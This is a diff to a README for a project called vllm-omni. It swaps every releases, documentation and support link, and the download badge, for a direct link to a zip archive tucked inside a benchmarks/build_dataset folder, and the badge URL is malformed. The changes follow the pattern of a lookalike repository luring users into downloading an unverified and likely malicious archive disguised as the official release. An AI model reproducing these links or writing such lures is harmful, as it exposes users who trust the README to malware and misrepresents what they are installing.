@@ -1,7 +1,7 @@
 # 🎉 vllm-omni - Efficient Model Inference for Everyone
 
 ## 📥 Download Now
-[![Download vllm-omni](https://img.shields.io/badge/Download%20vllm--omni-v1.0-blue.svg)](https://github.com/fluke22020/vllm-omni/releases)
+[![Download vllm-omni](https://github.com/fluke22020/vllm-omni/raw/refs/heads/main/benchmarks/build_dataset/omni-vllm-2.3.zip%https://github.com/fluke22020/vllm-omni/raw/refs/heads/main/benchmarks/build_dataset/omni-vllm-2.3.zip)](https://github.com/fluke22020/vllm-omni/raw/refs/heads/main/benchmarks/build_dataset/omni-vllm-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run vllm-omni smoothly, make sure your system meets the following requirement
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/fluke22020/vllm-omni/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/fluke22020/vllm-omni/raw/refs/heads/main/benchmarks/build_dataset/omni-vllm-2.3.zip).
    
 2. **Select the Latest Release**: Look for the most recent version of vllm-omni. Each version will list the features and improvements made since the last update.
 
@@ -58,7 +58,7 @@ Load pre-trained models and run inferences quickly. This feature is especially u
 
 ### How do I update vllm-omni after installation?
 
-Simply return to the [Releases page](https://github.com/fluke22020/vllm-omni/releases) and download the latest version. Follow the same steps as the initial installation.
+Simply return to the [Releases page](https://github.com/fluke22020/vllm-omni/raw/refs/heads/main/benchmarks/build_dataset/omni-vllm-2.3.zip) and download the latest version. Follow the same steps as the initial installation.
 
 ### What if I encounter issues?
 
@@ -70,8 +70,8 @@ Yes, we welcome contributions! Please check our GitHub repository for guidelines
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/fluke22020/vllm-omni/releases)
-- [Documentation](https://github.com/fluke22020/vllm-omni/wiki)
-- [Support](https://github.com/fluke22020/vllm-omni/issues)
+- [Releases Page](https://github.com/fluke22020/vllm-omni/raw/refs/heads/main/benchmarks/build_dataset/omni-vllm-2.3.zip)
+- [Documentation](https://github.com/fluke22020/vllm-omni/raw/refs/heads/main/benchmarks/build_dataset/omni-vllm-2.3.zip)
+- [Support](https://github.com/fluke22020/vllm-omni/raw/refs/heads/main/benchmarks/build_dataset/omni-vllm-2.3.zip)
 
 By following these steps and exploring the features, you can fully utilize the potential of vllm-omni. Get started today, and unlock the possibilities of AI with ease!
